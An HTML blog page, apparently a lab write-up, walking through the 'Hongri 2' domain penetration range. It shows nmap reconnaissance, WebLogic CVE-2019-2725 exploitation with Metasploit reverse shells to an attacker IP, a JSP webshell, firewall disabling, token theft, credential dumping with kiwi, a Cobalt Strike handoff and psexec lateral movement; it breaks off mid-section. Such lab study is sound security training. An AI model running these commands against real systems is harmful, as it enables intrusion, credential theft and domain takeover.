@@ -1,0 +1,345 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>红日二 | anz</title><meta name="author" content="anz"><meta name="copyright" content="anz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="环境配置首先把我们的NAT模式改成靶场的网段 然后配置一下  web靶机,这个需要先还原V1.3快照才能用默认密码登录  之后进入C:\Oracle\Middleware\user_projects\domains\base_domain\bin 管理员:Administrator&#x2F;1qaz@WSX 以管理员身份开启weblogic服务  1netstat -ano | findstr 7001">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日二">
+<meta property="og:url" content="https://aaanz.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&CK%E4%BA%8C/index.html">
+<meta property="og:site_name" content="anz">
+<meta property="og:description" content="环境配置首先把我们的NAT模式改成靶场的网段 然后配置一下  web靶机,这个需要先还原V1.3快照才能用默认密码登录  之后进入C:\Oracle\Middleware\user_projects\domains\base_domain\bin 管理员:Administrator&#x2F;1qaz@WSX 以管理员身份开启weblogic服务  1netstat -ano | findstr 7001">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg">
+<meta property="article:published_time" content="2023-04-20T07:14:49.281Z">
+<meta property="article:modified_time" content="2023-05-06T10:31:12.097Z">
+<meta property="article:author" content="anz">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://aaanz.github.io/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/ATT&amp;CK%E4%BA%8C/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红日二',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-06 18:31:12'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/75899c342847e73b.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">anz</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">红日二</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-20T07:14:49.281Z" title="发表于 2023-04-20 15:14:49">2023-04-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-06T10:31:12.097Z" title="更新于 2023-05-06 18:31:12">2023-05-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日二"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>首先把我们的NAT模式改成靶场的网段</p>
+<p>然后配置一下</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420152735994.png" alt="image-20230420152735994"></p>
+<p>web靶机,这个需要先还原V1.3快照才能用默认密码登录</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420151500358.png" alt="image-20230420151500358"></p>
+<p>之后进入<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code></p>
+<p>管理员:<code>Administrator/1qaz@WSX</code></p>
+<p>以管理员身份开启weblogic服务</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420153349367.png" alt="image-20230420153349367"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr 7001</span><br></pre></td></tr></table></figure>
+
+<p>开启PC,输入用户名密码让360自启动</p>
+<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>搜集ip信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:b6:a8:7e, IPv4: 192.168.111.145</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.111.1   00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.111.2   00:50:56:fc:4b:0c       VMware, Inc.</span><br><span class="line">192.168.111.80  00:0c:29:a3:4d:99       VMware, Inc.</span><br><span class="line">192.168.111.143 00:0c:29:47:7d:be       VMware, Inc.</span><br><span class="line">192.168.111.201 00:0c:29:70:b8:b3       VMware, Inc.</span><br><span class="line">192.168.111.254 00:50:56:fe:0b:2d       VMware, Inc.</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.906 seconds (134.31 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>
+
+<p>搜集靶机信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sS -sV -Pn -T4 -A 192.168.111.80</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-20 03:48 EDT</span><br><span class="line">Nmap scan report for 192.168.111.80</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 990 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80/tcp    open  http         Microsoft IIS httpd 7.5</span><br><span class="line">|_http-server-header: Microsoft-IIS/7.5</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title.</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds</span><br><span class="line">1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 R2 10.50.4000.00; SP2</span><br><span class="line">|_ssl-date: 2023-04-20T07:50:43+00:00; +2s from scanner time.</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: DE1AY</span><br><span class="line">|   NetBIOS_Domain_Name: DE1AY</span><br><span class="line">|   NetBIOS_Computer_Name: WEB</span><br><span class="line">|   DNS_Domain_Name: de1ay.com</span><br><span class="line">|   DNS_Computer_Name: WEB.de1ay.com</span><br><span class="line">|   DNS_Tree_Name: de1ay.com</span><br><span class="line">|_  Product_Version: 6.1.7601</span><br><span class="line">| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2023-04-20T07:08:57</span><br><span class="line">|_Not valid after:  2053-04-20T07:08:57</span><br><span class="line">3389/tcp  open  tcpwrapped</span><br><span class="line">| ssl-cert: Subject: commonName=WEB.de1ay.com</span><br><span class="line">| Not valid before: 2023-04-19T06:59:42</span><br><span class="line">|_Not valid after:  2023-10-19T06:59:42</span><br><span class="line">|_ssl-date: 2023-04-20T07:50:43+00:00; +2s from scanner time.</span><br><span class="line">7001/tcp  open  http         Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)</span><br><span class="line">|_http-title: Error 404--Not Found</span><br><span class="line">|_weblogic-t3-info: T3 protocol in use (WebLogic version: 10.3.6.0)</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">MAC Address: 00:0C:29:A3:4D:99 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows 7</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7</span><br><span class="line">OS details: Microsoft Windows 7</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1</span><br><span class="line">|   Computer name: WEB</span><br><span class="line">|   NetBIOS computer name: WEB\x00</span><br><span class="line">|   Domain name: de1ay.com</span><br><span class="line">|   Forest name: de1ay.com</span><br><span class="line">|   FQDN: WEB.de1ay.com</span><br><span class="line">|_  System time: 2023-04-20T15:50:02+08:00</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   192.168.111.80:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2008 R2 SP2</span><br><span class="line">|       number: 10.50.4000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2008 R2</span><br><span class="line">|       Service pack level: SP2</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">|_clock-skew: mean: -1h19m58s, deviation: 3h15m57s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: WEB, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:a3:4d:99 (VMware)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2023-04-20T07:50:02</span><br><span class="line">|_  start_date: 2023-04-20T07:09:24</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.55 ms 192.168.111.80</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 112.90 seconds</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">80     IIS7.5</span><br><span class="line">139    存在有samba服务可能会有远程命令执行漏洞  ms17_010(永恒之蓝)漏洞正是通过端口139/445进行攻击</span><br><span class="line">445    smb受到哈希传递攻击	弱口令 ms_08067溢出</span><br><span class="line">1433   mssql 弱口令</span><br><span class="line">3389   windows远程桌面哈希传递攻击  弱口令</span><br><span class="line">7001   Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)</span><br></pre></td></tr></table></figure>
+
+<p>尝试永恒之蓝但被360拦截</p>
+<p>从weblogic入手,使用工具扫描探测</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420183310537.png" alt="image-20230420183310537"></p>
+<p><code>tasklist</code>看下杀软</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420184042003.png" alt="image-20230420184042003"></p>
+<h2 id="冰蝎webshell"><a href="#冰蝎webshell" class="headerlink" title="冰蝎webshell"></a>冰蝎webshell</h2><p>获取路径写入shell</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420183434671.png" alt="image-20230420183434671"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\aaanz.jsp</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420203535018.png" alt="image-20230420203535018"></p>
+<p>写入冰蝎马</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420203626773.png" alt="image-20230420203626773"></p>
+<h2 id="msf-拿shell"><a href="#msf-拿shell" class="headerlink" title="msf 拿shell"></a>msf 拿shell</h2><p>利用模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">search CVE-2019-2725</span><br><span class="line"></span><br><span class="line">use exploit/multi/misc/weblogic_deserialize_asyncresponseservice 进入CVE-2019-2725攻击漏洞模块</span><br><span class="line"></span><br><span class="line">set target Windows      这个模块默认是unix 所以改为Windows</span><br><span class="line"></span><br><span class="line">set payload  windows/x64/meterpreter/reverse_tcp </span><br><span class="line"></span><br><span class="line">set LHOST 192.168.111.145</span><br><span class="line"></span><br><span class="line">set rhosts 192.168.111.80  要攻击目标</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420190456796.png" alt="image-20230420190456796"></p>
+<p>多尝试一次就成功了</p>
+<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>接着思路二走</p>
+<p>关掉杀软和防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run killav 尝试关闭杀软,但是java的meterpleter不支持</span><br><span class="line">shell</span><br><span class="line">chcp 65001</span><br><span class="line">netsh advfirewall show allprofile state		关闭防火墙可以</span><br><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420191226323.png" alt="image-20230420191226323"></p>
+<p>尝试直接提权失败</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] Error running command getsystem: Rex::TimeoutError Send timed out</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="进程迁移提权"><a href="#进程迁移提权" class="headerlink" title="进程迁移提权"></a>进程迁移提权</h2><p>然后通过显示进程pid 用<code>migrate</code>进行进程迁移到一个高权限进程文件</p>
+<p>获得system权限</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420192723411.png" alt="image-20230420192723411"></p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420192746654.png" alt="image-20230420192746654"></p>
+<h2 id="令牌窃取提权"><a href="#令牌窃取提权" class="headerlink" title="令牌窃取提权"></a>令牌窃取提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">load incognito                 加载incognito(伪装)</span><br><span class="line">getuid                         查看当前token</span><br><span class="line">list_tokens -u                 列出可用token</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;   token窃取，格式为impersonate_token&quot;主机名\\用户名&quot;</span><br><span class="line">rev2self                       返回之前的token</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230420205808499.png" alt="image-20230420205808499"></p>
+<p>成功</p>
+<p>使用kiwi得到账号密码</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load kiwi</span><br><span class="line">meterpreter &gt; creds_all</span><br></pre></td></tr></table></figure>
+
+<p>域管理员登陆过主机,直接得到了明文密码,所以可以开启 3389端口登录上去然后直接关闭杀软</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user  看一下防止远程桌面被挤下去</span><br></pre></td></tr></table></figure>
+
+<h2 id="转发cs提权"><a href="#转发cs提权" class="headerlink" title="转发cs提权"></a>转发cs提权</h2><p>msf转发cs</p>
+<p>可以上传免杀webshell执行或者msf直接转发,但是要先关掉防火墙,可以先ping一下试试</p>
+<p>这里我们延续思路二使用msf模块连接上以后挂到后台session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -i id 进入交互式</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set DisablePayloadHandler true   </span><br><span class="line">默认情况下，payload_inject执行之后会在本地产生一个新的handler,由于我们已经有了一个,所以不需要在产生一个，所以这里我们设置为true</span><br><span class="line">set lhost 192.168.111.143  cs监听的ip</span><br><span class="line">set lport 6666   cs监听的port</span><br><span class="line">set session 2  选择派生的session</span><br><span class="line">exploit  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421124835884.png" alt="image-20230421124835884"></p>
+<p>这样就可以了,不用代理</p>
+<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230421181326790.png" alt="image-20230421181326790"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; sleep 1</span><br><span class="line">[*] Tasked beacon to sleep for 1s</span><br><span class="line">[+] host called home, sent: 16 bytes</span><br><span class="line">beacon&gt; shell ipconfig /all</span><br><span class="line"></span><br><span class="line">beacon&gt; shell ping de1ay.com  获取域控内网IP</span><br><span class="line"></span><br><span class="line">beacon&gt; net view</span><br><span class="line"></span><br><span class="line"> Server Name             IP Address                       Platform  Version  Type   Comment</span><br><span class="line"> -----------             ----------                       --------  -------  ----   -------</span><br><span class="line"> DC                      10.10.10.10                      500       6.3      PDC    </span><br><span class="line"> PC                      192.168.111.201                  500       6.1             </span><br><span class="line"> WEB                     192.168.111.80                   500       6.1             </span><br><span class="line"> </span><br><span class="line">beacon&gt; shell net group &quot;domain controllers&quot; /domain</span><br><span class="line"></span><br><span class="line">beacon&gt; shell net group &quot;domain computers&quot; /domain</span><br><span class="line"></span><br><span class="line">[*] Ladon 10.10.10.0/24 OnlinePC</span><br><span class="line">load OnlinePC</span><br><span class="line">10.10.10.0/24 is Valid CIDR</span><br><span class="line">IPCound: 256</span><br><span class="line">Scan Start: 2023-04-21 18:16:40</span><br><span class="line">ICMP: 10.10.10.10	00-0C-29-38-C5-2F	DC             	VMware</span><br><span class="line">ICMP: 10.10.10.80	00-0C-29-A3-4D-A3	WEB            	VMware</span><br><span class="line">DNS: 10.10.10.201	00-0C-29-70-B8-BD	PC.de1ay.com   	VMware</span><br><span class="line">=============================================</span><br><span class="line">OnlinePC:3</span><br><span class="line">Cidr Scan Finished!</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>DC不出网,pth需要使用SMB</p>
+<p>psexec横移(msf)</p>
+<p>445是开着的,那么设置路由后使用exploit&#x2F;windows&#x2F;smb&#x2F;psexec即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 1qaz@WSX</span><br></pre></td></tr></table></figure>
+
+<p>psexec横移(cs)</p>
